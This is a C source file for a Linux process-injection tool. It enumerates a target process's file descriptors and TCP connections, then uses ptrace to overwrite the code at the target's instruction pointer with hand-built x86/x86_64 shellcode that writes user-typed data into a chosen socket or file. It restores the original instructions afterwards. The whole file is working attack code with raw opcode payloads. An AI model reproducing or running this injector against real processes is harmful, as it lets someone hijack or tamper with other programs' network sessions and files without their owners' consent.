#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>

#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

#include "design.h"

#define MAX_PAYLOAD_SIZE 255
#ifdef X64

#define DWORD 8
#define SET_SYS_WRITE "\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\xba\x0a\x00\x00\x00\xba"
#define SIZE_SYS_WRITE 16
#define FD_OFFSET 6
#define SET_SYSCALL "\x48\x89\xe6\x0f\x05"
#define SIZE_SYSCALL 5
#define SIZE_SIZE_PAYLOAD 8
#define PUSH1 0x48
#define PUSH2 0xbe
#define PUSH3 0x56
#else
#define DWORD 4
#define SET_SYS_WRITE "\xb8\x04\x00\x00\x00\xbb\x03\x00\x00\x00\xba"
#define FD_OFFSET 6
#define SIZE_SYS_WRITE 11
#define SET_SYSCALL "\x89\xe1\xcd\x80"
#define SIZE_SYSCALL 4
#define SIZE_SIZE_PAYLOAD 4
#define PUSH 0x68
#endif

typedef struct s_payload {
    size_t size; 
    char *data;
} Payload ;

/*commit*/
char *remove_space(char* str){

    char *ret = calloc(strlen(str),  sizeof(char));
    char *retour = ret ;
    while(*str == ' ') str++;
    while(*str){
        if(*(str-1) == ' ' && *str == ' '){
            str++;
            continue;
        }
        else {
            *ret++ = *str; 
        }
        str++;
    }
    return retour ;
}



void print_fd(pid_t pid, int *fds, int nb_fds, long *inodes, int nb_inodes)
{    

    char net_file[25], tmp[1024] = {0}, *ip;
    FILE *f;
    int ret, i, null, found = 0;
    unsigned int ipsrc,portsrc,ipdst,portdst,state;
    long node;

    sprintf(net_file,"/proc/%d/net/tcp",pid);
    f = fopen(net_file,"r");

    puts("FD\tTYPE\tSTATE\tIP");
    while(fgets(tmp, 1023, f)){

        char *parse = remove_space(tmp);
        ret = sscanf(parse,"%d: %x:%x %x:%x %x %x:%x %x:%x %x %x %x %ld %x %x %x %x %x %x %x",
            &null, &ipsrc, &portsrc, &ipdst, &portdst, &state, &null,&null,&null,&null,&null,&null,&null,&node,&null,&null,&null,&null,&null,&null,&null);
        free(parse);

       for(i = 0 ; i<nb_fds;i++){
            if(inodes[i] == node && ipsrc!=0 && ipdst!=0){
                found = 1 ;
                printf("%d\t", fds[i]);
                printf("TCP\t");
                printf("%d\t",state);
                
                ip = (char*)&ipsrc;
                printf("%u.%u.%u.%u:%u ->",(unsigned char)ip[0],(unsigned char)ip[1],(unsigned char)ip[2],(unsigned char)ip[3],portsrc);
                ip = (char*)&ipdst;
                printf("%u.%u.%u.%u:%u\n",(unsigned char)ip[0],(unsigned char)ip[1],(unsigned char)ip[2],(unsigned char)ip[3],portdst);
                
            }
        }

        bzero(tmp,1024);
    }
    fclose(f);    
    if(found == 0){
        puts("No choice ...");

    }
}

int do_choice(int* fds, int nb_fds)
{
    int choice, selected = 0;
    do {
        puts("Choice:");
        scanf("%d",&choice);
        for(int i =0; i < nb_fds;i++){
            if(choice == fds[i]){
                return choice;
            }
            if(choice==-1){
                return -1;
            }
        }
        puts("Bad choice");
    } while(!selected);

}


int choose_fd(pid_t pid)
{

    DIR* d;
    struct dirent *dir;
    struct stat st;
    char path[20];
    char inode_path[25];
   
    int *fds = NULL, choice;
    long *inodes = NULL ;
    int nb_fds = 1, nb_inodes = 1, selected = 0;

    bzero(&path,20);
    snprintf(path,19,"/proc/%ld/fd",pid);

    d = opendir(path);
    if (d) {
        puts("Available fd:");
        while ((dir = readdir(d)) != NULL) {
            
            if( !strcmp(dir->d_name,".") || !strcmp(dir->d_name,"..")){
                continue;
            }

            fds = realloc(fds, nb_fds * sizeof(int));
           
            fds[nb_fds-1] = atoi(dir->d_name);
            nb_fds++;

            bzero(inode_path, 25);
            sprintf(inode_path, "/proc/%ld/fd/%d", pid,fds[nb_fds-2] );
            stat(inode_path, &st);

            inodes = realloc(inodes, nb_inodes * sizeof(long));
            inodes[nb_inodes-1] = st.st_ino;
            nb_inodes++;
        }

        print_fd(pid, fds, nb_fds, inodes, nb_inodes);

        closedir(d);
        choice = do_choice(fds, nb_fds);
        free(fds);

        return choice ;
    }
    else {
        fprintf(stderr, "folder '%s' doesn't exist",path);
        return -1;
    }
  
}

Payload getPayload(void *ptr, size_t size, int fd){

    int reste = size % DWORD ;
    /* number of PUSH opcode + */
    int words = size / DWORD + (reste > 0 ? DWORD-reste+1 : 0) ;
    int i, first = 1;

        /* base size */
#ifdef X64
    int full_size = size + (words*3) +  + SIZE_SIZE_PAYLOAD + SIZE_SYS_WRITE + SIZE_SYSCALL ; 
#else
    int full_size = size + words + SIZE_SIZE_PAYLOAD + SIZE_SYS_WRITE + SIZE_SYSCALL +20 ;
#endif


    char *payload = calloc(full_size, sizeof(char)), *hlen, *p;

    Payload ret;
    ret.size = full_size ;
    ret.data = payload;

    memcpy(payload, SET_SYS_WRITE, SIZE_SYS_WRITE);
    payload += SIZE_SYS_WRITE ;

    /* insert fd num */
    memcpy(ret.data + FD_OFFSET, &fd, sizeof(int));

    /* set write size */

#ifdef X64
    memcpy(payload, &size, 4);    
    payload += 4 ;
#else
    memcpy(payload, &size, DWORD);    
    payload += DWORD ;

#endif

    p = (char*)ptr ;
    p+= size;

    while(size > 0){
        /* printf("size : %d", size); */
        if(first && reste !=0){

            //printf("\n Add :");
            p = p - reste ;
            #ifdef X64
            *payload++ = PUSH1 ;
            *payload++ = PUSH2 ;
#else
            *payload++ = PUSH ;
#endif
            for(i = 0 ; i<reste ; i++){
                *payload++ = *p++ ;
                //printf("%02x",*(payload-1));
            }
            // padding
            for(i=0 ; i< (DWORD - reste) ; i++){
                *payload++ = 0 ;  
               // printf("%02x",*(payload-1));
            }

#ifdef X64
          *payload++ = PUSH3 ;
#endif
            //printf("\n");
            p -= reste; // on a écrit 4 car padding+reste
            size -= reste;
            first = 0 ;
            
        }
        else {
            //printf("size : %d", size);
            p -= DWORD;
           
           //printf("\ncomplet: ");
#ifdef X64
            *payload++ = PUSH1 ;
            *payload++ = PUSH2 ;
            memcpy(payload,p,DWORD);
            payload += DWORD;
            *payload++ = PUSH3 ;

#else
            *payload++ = PUSH ;
            memcpy(payload,p,DWORD);
            payload += DWORD ;
#endif

            size -=DWORD ;

        }
        
    }

    memcpy(payload, SET_SYSCALL, SIZE_SYSCALL);

    //puts("payload:");
    //for(int i = 0; i < ret.size;i++){
    //    printf("%02x", ret.data[i]);
    //}
    return ret ;
}

const int long_size = sizeof(long);
void getdata(pid_t child, long addr,char *str, int len)
{
    char *laddr;
    int i, j;
    union u {
        long val;
        char chars[long_size];
    }data;
    i = 0;
    j = len / long_size;
    laddr = str;
    while(i < j) {
        data.val = ptrace(PTRACE_PEEKDATA, child,
        addr + i * DWORD, NULL);
        memcpy(laddr, data.chars, long_size);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if(j != 0) {
        data.val = ptrace(PTRACE_PEEKDATA, child,
        addr + i * DWORD, NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '\0';
}
void putdata(pid_t child, long addr,char *str, int len)
{
    char *laddr;
    int i, j;
    union u {
        long val;
        char chars[long_size];
    }data;
    i = 0;
    j = len / long_size;
    laddr = str;
    while(i < j) {
        memcpy(data.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, child,
        addr + i * DWORD, data.val);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if(j != 0) {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child,
        addr + i * DWORD, data.val);
    }
}
int main(int argc, char *argv[])
{
    pid_t traced_process;
    struct user_regs_struct regs, newregs;
    long ins;
    size_t size ;
    char *string = calloc(MAX_PAYLOAD_SIZE, sizeof(char)), *backup;

#ifdef X64
    puts(" - x86_64 -");
#else
    puts(" - x86 -");
#endif

    print_ban();

    if(argc != 2) {
        printf("Usage: %s <pid to be traced>\n", argv[0], argv[1]);
        exit(1);
    }

    traced_process = atoi(argv[1]);
    int fd = choose_fd(traced_process);

    if(fd == -1){
        free(string);
        return 1;
    }

    printf("Write in fd n°%d", fd);

    while(1){

        printf("\nInject-Data >");
        fflush(stdout);
        setbuf(stdin, NULL);
        bzero(string,MAX_PAYLOAD_SIZE);
        fgets(string ,MAX_PAYLOAD_SIZE-1,stdin);

        if(!strncmp(string,"stop",4)){
            break ;
        }
        else {      

            size = strlen(string);
            Payload p = getPayload(string, size, fd);
            backup = malloc(p.size * sizeof(char));

            // debug file opcodes
            printf("Write payload in inject.bin...\n");
            FILE* f = fopen("inject.bin","w");
            fwrite(p.data,p.size,1,f);
            fclose(f);

            ptrace(PTRACE_ATTACH, traced_process, NULL, NULL);
            puts("Waiting for signal ...");
            wait(NULL);
            ptrace(PTRACE_GETREGS, traced_process, NULL, &regs);

#ifdef X64
            getdata(traced_process, regs.rip, backup, p.size);
            putdata(traced_process, regs.rip, p.data, p.size);
#else
            getdata(traced_process, regs.eip, backup, p.size);
            putdata(traced_process, regs.eip, p.data, p.size);
#endif

            ptrace(PTRACE_SETREGS, traced_process, NULL, &regs);
            ptrace(PTRACE_CONT, traced_process, NULL, NULL);
            wait(NULL);
            printf("[-] Process stopped - restore original instructions\n");

#ifdef X64
            putdata(traced_process, regs.rip, backup, p.size);
#else
            putdata(traced_process, regs.eip, backup, p.size);
#endif

            ptrace(PTRACE_SETREGS, traced_process, NULL, &regs);
            printf("[+] Resuming process\n");
            ptrace(PTRACE_DETACH, traced_process, NULL, NULL);

            free(p.data);
            free(backup);
        }

    }
    free(string);

    return 0;
}
